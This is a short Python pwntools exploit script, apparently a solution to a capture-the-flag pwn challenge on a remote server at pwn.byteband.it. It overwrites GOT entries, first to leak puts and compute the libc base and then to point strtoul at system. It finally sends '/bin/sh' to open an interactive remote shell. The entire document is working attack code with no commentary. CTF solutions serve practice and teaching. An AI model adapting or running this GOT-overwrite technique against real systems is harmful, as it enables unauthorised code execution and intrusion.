#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'
context.terminal = ['tmux', 'neww']
#r = process('./chall')
r = remote('pwn.byteband.it', 8000)
chal = ELF('./chall')
libc = ELF('./libc.so.6')

r.sendafter('size: ', '1234567')
r.sendafter('idx: ', str(0x12f558))
r.sendafter('where: ', str(chal.got['__stack_chk_fail']))
r.send(p64(0x4007d6))
r.recvuntil('puts: ')
puts = int(r.recvline(), 16)
libc.address = puts - libc.symbols.puts
print hex(libc.address)

r.sendafter('size: ', '1234567')
r.sendafter('idx: ', str(0x745559))
r.sendafter('where: ', str(chal.got['strtoul']))
r.send(p64(libc.symbols.system))

r.sendafter('size: ', '/bin/sh')
r.interactive()
